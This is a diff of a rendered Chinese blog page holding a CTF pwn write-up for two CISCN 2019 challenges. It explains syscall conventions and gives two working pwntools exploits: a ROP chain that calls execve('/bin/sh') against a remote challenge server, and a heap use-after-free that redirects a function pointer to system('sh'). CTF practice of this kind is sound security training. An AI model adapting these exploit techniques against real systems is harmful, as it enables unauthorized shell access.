@@ -20,12 +20,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="[TOC] ciscn_2019_s_3 　　32位与64位 系统调用的区别：  　　1. 传参方式不同 　　2. 系统调用号 不同 　　3. 调用方式 不同  　　32位： 12345传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器调用号：sys_read 的调用号 为 3 sys_write 的调">
+    <meta name="description" content="[TOC] ciscn_2019_s_3　　32位与64位 系统调用的区别：  　　1. 传参方式不同 　　2. 系统调用号 不同 　　3. 调用方式 不同  　　32位： 12345传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4调用方式">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CISCN_PWN">
 <meta property="og:url" content="http://example.com/2021/04/08/CISCN-PWN/index.html">
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
-<meta property="og:description" content="[TOC] ciscn_2019_s_3 　　32位与64位 系统调用的区别：  　　1. 传参方式不同 　　2. 系统调用号 不同 　　3. 调用方式 不同  　　32位： 12345传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器调用号：sys_read 的调用号 为 3 sys_write 的调">
+<meta property="og:description" content="[TOC] ciscn_2019_s_3　　32位与64位 系统调用的区别：  　　1. 传参方式不同 　　2. 系统调用号 不同 　　3. 调用方式 不同  　　32位： 12345传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4调用方式">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2021/04/08/CISCN-PWN/image-20210511160829045.png">
 <meta property="og:image" content="http://example.com/2021/04/08/CISCN-PWN/image-20210511161319133.png">
@@ -348,7 +348,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">742</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">737</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -505,8 +505,7 @@
                 <main class="main post-page">
     <article class="article-entry">
         <p>[TOC]</p>
-<h2 id="ciscn_2019_s_3">ciscn_2019_s_3</h2>
-<p>　　32位与64位 系统调用的区别：</p>
+<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>　　32位与64位 系统调用的区别：</p>
 <blockquote>
 <p>　　1. 传参方式不同</p>
 <p>　　2. 系统调用号 不同</p>
@@ -514,41 +513,38 @@
 </blockquote>
 <p>　　32位：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器</span><br><span class="line"></span><br><span class="line">调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4</span><br><span class="line"></span><br><span class="line">调用方式: 使用 int 80h 中断进行系统调用</span><br></pre></td></tr></table></figure>
+
 <p>　　64位：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</span><br><span class="line"></span><br><span class="line">调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1</span><br><span class="line"></span><br><span class="line">stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15</span><br><span class="line"></span><br><span class="line">调用方式: 使用 syscall 进行系统调用</span><br></pre></td></tr></table></figure>
-<p>调用：$rax==59，$rdi==“/bin/sh”，$rsi==0，$rdx==0</p>
+
+<p>调用：$rax==59，$rdi==“&#x2F;bin&#x2F;sh”，$rsi==0，$rdx==0</p>
 <p>首先往栈上写0x400，然后从栈上读0x30</p>
 <p>经过调试发现输入后返回的是写入栈上的位置。</p>
-<figure>
-<img src="/2021/04/08/CISCN-PWN/image-20210511160829045.png" alt="image-20210511160829045"><figcaption aria-hidden="true">image-20210511160829045</figcaption>
-</figure>
+<p><img src="/2021/04/08/CISCN-PWN/image-20210511160829045.png" alt="image-20210511160829045"></p>
 <p>将0x00007ffe7d621e58减去0x00007ffe7d621d40得到0x118（固定）</p>
-<p>所以经过recv的地址减去0x118就是写入/bin/sh的地址</p>
+<p>所以经过recv的地址减去0x118就是写入&#x2F;bin&#x2F;sh的地址</p>
 <p>有个gadgets函数：</p>
-<figure>
-<img src="/2021/04/08/CISCN-PWN/image-20210511161319133.png" alt="image-20210511161319133"><figcaption aria-hidden="true">image-20210511161319133</figcaption>
-</figure>
+<p><img src="/2021/04/08/CISCN-PWN/image-20210511161319133.png" alt="image-20210511161319133"></p>
 <p>其中的0x3B就是59，系统调用，</p>
 <blockquote>
-<p>hex(0x00007ffe7d621e58 - 0x7ffe7d621d40) '0x118'</p>
+<p>hex(0x00007ffe7d621e58 - 0x7ffe7d621d40)<br>‘0x118’</p>
 </blockquote>
-<figure>
-<img src="/2021/04/08/CISCN-PWN/image-20210511162201775.png" alt="image-20210511162201775"><figcaption aria-hidden="true">image-20210511162201775</figcaption>
-</figure>
+<p><img src="/2021/04/08/CISCN-PWN/image-20210511162201775.png" alt="image-20210511162201775"></p>
 <p>r12是将要执行的地址。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26613</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_s_3&quot;)</span></span><br><span class="line">vulun_addr = <span class="number">0x4004ED</span></span><br><span class="line">mov_rax = <span class="number">0x4004E2</span></span><br><span class="line">pop_rbx_rbp_r12= <span class="number">0x40059a</span></span><br><span class="line">mov_call = <span class="number">0x400580</span></span><br><span class="line">sys_call = <span class="number">0x400517</span></span><br><span class="line">pop_rdi = <span class="number">0x04005a3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span> + p64(vulun_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_add = u64(io.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span> + p64(pop_rbx_rbp_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+ p64(bin_sh_add+<span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload +=  p64(mov_call)+p64(mov_rax) +p64(pop_rdi)+ p64(bin_sh_add) + p64(sys_call)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="ciscn_2019_n_3">ciscn_2019_n_3</h2>
-<p>new()中，分为两种type，一种是整形，一种是字符串，字符串的话将地址放在chunk中。</p>
+
+
+
+<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>new()中，分为两种type，一种是整形，一种是字符串，字符串的话将地址放在chunk中。</p>
 <p>分配的0x10的有8byte写了两个函数的地址。（str_printf和str_free）</p>
 <p>所以直接将free的地址改为system然后执行就OK。</p>
 <p>这道题第一开始一直没太搞懂。</p>
-<figure>
-<img src="/2021/04/08/CISCN-PWN/image-20210512205816626.png" alt="image-20210512205816626"><figcaption aria-hidden="true">image-20210512205816626</figcaption>
-</figure>
+<p><img src="/2021/04/08/CISCN-PWN/image-20210512205816626.png" alt="image-20210512205816626"></p>
 <p>他delete了1和2之后，bin中有了两个，再下来new3 写入的时候，首先是malloc了1e0的那个位置，之后存放的地址是1a0那里，一直以为是1f0的位置。。。所以写入的sh+system的地址是1a0。</p>
 <p>还有就是为什么sh的地址是1a0，可以这样查看，<img src="/2021/04/08/CISCN-PWN/image-20210512210029878.png" alt="image-20210512210029878"></p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_n_3&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;ciscn_2019_n_3&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span>(<span class="params">idx,<span class="built_in">type</span>,value,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Type &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Value &gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Length &gt; &quot;</span>)</span><br><span class="line">            p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Value &gt; &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> length == <span class="number">8</span>:</span><br><span class="line">                p.send(value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shownote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x2c</span>)</span><br><span class="line">newnote(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x2c</span>)</span><br><span class="line">newnote(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x2c</span>)</span><br><span class="line"></span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">newnote(<span class="number">3</span>,<span class="number">2</span>,<span class="string">&#x27;sh\x00\x00&#x27;</span>+ p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]),<span class="number">0xc</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
     </article>
     <!-- license -->
@@ -698,7 +694,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_2019_s_3"><span class="toc-number">1.</span> <span class="toc-text">ciscn_2019_s_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_2019_n_3"><span class="toc-number">2.</span> <span class="toc-text">ciscn_2019_n_3</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-s-3"><span class="toc-number">1.</span> <span class="toc-text">ciscn_2019_s_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-3"><span class="toc-number">2.</span> <span class="toc-text">ciscn_2019_n_3</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1632,6 +1628,11 @@
                 PWN
             </span>
         
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="RE">
                 <span class="iconfont-archer">&#xe606;</span>
                 RE
@@ -1642,24 +1643,19 @@
                 BUU刷题
             </span>
         
-            <span class="sidebar-tag-name" data-tags="WEB">
-                <span class="iconfont-archer">&#xe606;</span>
-                WEB
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="Java">
                 <span class="iconfont-archer">&#xe606;</span>
                 Java
             </span>
         
-            <span class="sidebar-tag-name" data-tags="内网">
-                <span class="iconfont-archer">&#xe606;</span>
-                内网
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="免杀">
                 <span class="iconfont-archer">&#xe606;</span>
                 免杀
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="内网">
+                <span class="iconfont-archer">&#xe606;</span>
+                内网
             </span>
         
             <span class="sidebar-tag-name" data-tags="VulnHub">
@@ -1692,14 +1688,14 @@
                 Linux
             </span>
         
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="OS">
+                <span class="iconfont-archer">&#xe606;</span>
+                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="WriteUp">
